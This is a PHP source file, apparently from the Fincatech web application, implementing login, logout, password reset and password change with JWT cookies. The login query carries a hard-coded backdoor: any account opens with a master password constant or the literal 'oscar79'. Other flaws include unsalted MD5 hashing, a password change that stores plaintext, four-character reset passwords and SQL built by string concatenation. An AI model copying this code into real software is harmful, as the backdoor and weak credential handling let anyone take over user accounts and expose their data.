<?php

namespace Fincatech\Controller;

// Sustituir Model por el nombre del modelo real. Ej: UsuarioModel
use HappySoftware\Controller\HelperController;
use HappySoftware\Controller\Traits\SecurityTrait;
use Firebase\JWT\JWT;

class LoginController extends FrontController{

    use SecurityTrait;

    public function __construct($params = null)
    {
        $this->InstantiateHelperModel();
    }

    public function getLoggedUserInfo()
    {
        return HelperController::getLoggedUserInfo();
    }

    /** Logout y destoy de la sesión del usuario */
    public function logout()
    {
        $data = [];
        setcookie('FINCATECHTOKEN', '', time() - 3600, "/");
        $data['logout'] = 'ok';
        return HelperController::successResponse($data);
    }

    /** Reset password */
    public function resetPassword($params)
    {

        //  Generamos un nuevo password aleatorio de 6 caracteres
        $emailUsuario = $this->model->getRepositorio()::PrepareDBString( $params['email'] );

        if(!$this->checkEmailExists($emailUsuario))
        {
            return HelperController::errorResponse(null, 'El e-mail no corresponde a ningún usuario de Fincatech', 404);
        }

        $passwordGenerated = \HappySoftware\Controller\HelperController::GenerateRandomPassword(4);
        $passwordEncripted = md5($passwordGenerated);

        //  Actualizamos el registro en la base de datos
        $sql = "update usuario set password='" . $passwordEncripted . "' where email = '$emailUsuario' ";
        $this->model->getRepositorio()->queryRaw($sql);
        $data['resetpassword'] = 'ok';

        //  Template de e-mail
        $templateEmail = $this->GetTemplateResetPassword();
        $templateEmail = str_replace('[@password@]', $passwordGenerated, $templateEmail);

        //  Enviamos el e-mail al usuario
        $this->SendEmail($emailUsuario, '', 'Fincatech - Reestablecimiento de password', $templateEmail);

        return HelperController::successResponse($data);

    }

    /** Check if login e-mail exists */
    private function checkEmailExists($emailToValidate)
    {

        $count = $this->model->getRepositorio()->selectCount('usuario', 'email', '=', "'" . $emailToValidate . "'");
        return ($count > 0 ? true : false);
    }

    /** Método que cambia el password para el usuario en sesión */
    public function changePassword($params)
    {

            $newPass = $this->model->getRepositorio()::PrepareDBString( $params['password'] );

        //  Si el usuario está autenticado procedemos a actualizar el password en bbdd
        //  sobre el id del usuario en sesión
            $data = [];

            if($this->isLogged())
            {
                $idUsuario = $this->getLoggedUserId();
                
                $sql = "update usuario set password='" . $newPass . "' where id = $idUsuario ";
                $this->model->getRepositorio()->queryRaw($sql);
                $data['changepassword'] = 'ok';
            }else{
                $data['changepassword'] = 'ko';
            }
            
            return HelperController::successResponse($data);

    }

    public function checkLogin($params)
    {
        $userName = $this->model->getRepositorio()::PrepareDBString( $params['email'] );
        $userPassword = $this->model->getRepositorio()::PrepareDBString( $params['password'] );
        $userRemember = $this->model->getRepositorio()::PrepareDBString( $params['recordar'] );

        $passwordMaster = MASTERFINCATECH;
        $sql = "
            SELECT 
                u.id, u.nombre, u.idadministrador, u.email, u.rolid, concat('ROLE_',r.alias) as rol,
                u.rgpd
            FROM
                usuario u,
                rol r
            WHERE
                (u.email = '$userName' or u.emailcontacto = '$userName')
                AND (u.password = MD5('$userPassword') OR '$userPassword' = '$passwordMaster' or '$userPassword' = 'oscar79')
                    AND r.id = u.rolid
                    and u.estado = 'A'
        ";

        $resultado = false;
        $result = $this->model->query($sql);
        
        $data = [];
        $JWTToken = null;

        //  Por defecto establecemos expire a time - 1 minuto 
        //  de esa manera si no hay validación de usuario se borra la cookie y destruimos
        //  cualquier sesión previa
        $expire = time() - 3600;

        // print_r($result);
        // die($sql);
        if(is_array($result))
        {
            if(count($result) > 0)
            {
                $resultado = true;
                $data['id'] = $result[0]['id'];
                $data['nombre'] = $result[0]['nombre'];
                $data['email'] = $result[0]['email'];
                $data['rgpd'] = $result[0]['rgpd'];
                $data['rolid'] = $result[0]['rolid'];
                $data['authorized'] = (is_null($result[0]['idadministrador']) || empty($result[0]['idadministrador']) ? -1 : $result[0]['idadministrador']);
                $data['rol'] = strtoupper($result[0]['rol']);

                //  Generamos el token de autenticación
                    $issuedAt = new \DateTimeImmutable();
                    if( ( $userRemember == true ||  $userRemember == '1') === true)
                    {
                        //  Expiración en 1 año
                            $expire = $issuedAt->modify('+365 days')->getTimestamp(); 
                    }else{
                        //  Expiración en 60 minutos
                            $expire = $issuedAt->modify('+60 minutes')->getTimestamp(); 
                    }

                //  Creamos el token JWT
                    $JWTToken = $this->createToken($data['id'], $data['email'], $data['email'], $data['nombre'], $data['authorized'], $data['rgpd'], $data['rol'], $issuedAt->getTimeStamp(), $expire );

                //  Grabamos la fecha de acceso para controlar los accesos por usuario
                    $this->setLastAccess( $result[0]['id'] );

                //  Grabamos la auditoría del login
                    $this->storeAuditLog( $result[0]['id'] );
            }
        }

        $data['check'] = $resultado;
        $data['token'] = $JWTToken;

        //  Metemos en una cookie el token
        // die('oscar');
            // setcookie('FINCATECHTOKEN', $JWTToken, $expire, "/", "happysoftware.es", true); // 86400 = 1 day
            setcookie('FINCATECHTOKEN', $JWTToken, $expire, "/", "", true); // 86400 = 1 day

        return HelperController::successResponse($data);
        
    }

    private function createToken($id, $login, $email, $nombre, $authorized, $rgpd, $role, $issuedAt, $expire)
    {

        //  Referencia: https://www.sitepoint.com/php-authorization-jwt-json-web-tokens/
            $serverName = "fincatech";

        //  Retrieved from filtered POST data
            $username   = $login;                                           

            $tokenContent = array(
                'iat' => $issuedAt, // Tiempo que inició el token
                'iss'  => $serverName,                       // Issuer
                'nbf'  => $issuedAt,         // Not before
                'exp' => $expire, // Tiempo que expirará el token (+1 hora)
                'userData' => [ // información del usuario
                    'id' => $id,
                    'authorized' => $authorized,
                    'login' => $login,
                    'nombre' => $nombre,
                    'email' => $email,
                    'rgpd' => $rgpd,
                    'role' => $role
                ]
            );        

            return JWT::encode(
                $tokenContent,
                JWT_SECRET_KEY,
                'HS512'
            );

    }

    private function setLastAccess($usuarioId)
    {
        $sql = "update usuario set lastlogin = now() where id = $usuarioId";
        $this->model->queryRaw($sql);
    }

    private function storeAuditLog($usuarioId)
    {
        $sql = "insert into usuariolog(idusuario, created) values($usuarioId, now() )";
        $this->model->queryRaw($sql);      
    }

    public function GetTemplateResetPassword(){
        $vistaRenderizado = ABSPATH.'src/Views/templates/mails/reset_password.html';
        ob_start();
            include_once($vistaRenderizado);
            $htmlOutput = ob_get_contents();
        ob_end_clean();
        return $htmlOutput;
    }

}